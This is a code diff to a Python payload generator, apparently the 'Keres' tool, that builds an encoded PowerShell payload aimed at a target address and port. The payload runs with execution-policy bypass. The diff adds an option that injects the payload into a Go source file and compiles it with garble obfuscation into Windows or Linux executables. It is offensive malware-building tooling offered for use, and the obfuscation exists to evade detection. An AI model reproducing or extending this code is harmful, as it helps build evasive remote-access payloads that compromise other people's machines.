@@ -7,6 +7,7 @@ import subprocess
 import sys
 import platform
 import base64
+import re
 
 def display_ansi_art(file_path):
     with open(file_path, 'r', encoding='latin-1') as file:
@@ -92,7 +93,7 @@ def create_exe(py_file):
         except subprocess.CalledProcessError as e:
             print(f"Error in subprocess: {e}")
 
-        print("windows Executable creation process completed.")
+        print("windows Executable creation process completed check ./dist.")
     except Exception as e:
         print(f"An error occurred: {e}")
 def encode_powershell_command(command):
@@ -131,6 +132,7 @@ def main():
     parser.add_argument("-p", "--port", required=True, type=int, help="Specify the target port")
     parser.add_argument("-Ps", "--save_ps_command", action="store_true", help="Save the PowerShell payload to a Keres.ps1 file in the Output folder")
     parser.add_argument("-Pl", "--platform", choices=['Linux', 'Windows'], help="Choose the targeted platform (Linux or Windows)")
+    parser.add_argument("-go", "--go", action="store_true", help="go binary")
 
     args = parser.parse_args()
     server_address = args.address
@@ -204,7 +206,32 @@ while ($true){{
 
 '''
     encoded_ps_command = encode_powershell_command(ps_command)
-    
+    if args.go and args.platform:
+        with open("pewpew.go", 'r') as file:
+            content = file.read()
+
+    # Use regular expression to find and replace the encodedPSCmd line
+        content = re.sub(r'encodedPSCmd := "(.*?)"', f'encodedPSCmd := "{encoded_ps_command}"', content)
+
+        with open("pewpew.go", 'w') as file:
+            file.write(content)
+        if platform.system().lower() != "windows":
+            if args.platform=="Windows":
+                subprocess.run("export GOOS=windows GOARCH=amd64", shell=True)
+                subprocess.run("garble -literals -tiny build -o ./Output/keres.exe pewpew.go", shell=True)
+                print("Finished creating the executable in Output folder.")
+            if args.platform=="Linux":
+
+                subprocess.run("export GOOS=linux ", shell=True)
+                subprocess.run("garble -literals -tiny build -o ./Output/keres pewpew.go", shell=True)
+                print("Finished creating the executable in Output folder.")
+        
+        else:
+            if args.platform=="Windows":
+                subprocess.run("garble  -literals -tiny build -o ./Output/keres.exe pewpew.go ")
+                print("Finished creating the executable in Output folder.")
+            
+        return
     if args.save_ps_command:
         ps_file_path = os.path.join("Output", "Keres.ps1")
         with open(ps_file_path, 'w') as ps_file:
@@ -261,9 +288,9 @@ if ($p) {
     }
 }\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand """+encoded_ps_command)
         print('\n')
-        print('generated  Powershell command')
+        print('generated  Powershell payload')
         print('\n')
-        print(f"PowerShell command saved to: {ps_file_path}")
+        print(f"PowerShell payload saved to: {ps_file_path}")
         return
     
     if hasattr(sys, '_MEIPASS'):
@@ -292,12 +319,19 @@ if ($p) {
 
     print('\n')
     print('generated  Powershell command')
-    
-    
     print('\n')
-    print("Creating the executable...")
-    print('\n')
-    create_exe('.dist/pewpew.py')
+    
+   
+    if args.go: 
+        print('\n')
+        print("You need to specify target platforme.")
+        print('\n')
+        exit()
+    else:
+        print('\n')
+        print("Creating the executable...")
+        print('\n')   
+        create_exe('.dist/pewpew.py')
     print("Finished creating the executable in Output folder.")
     
 
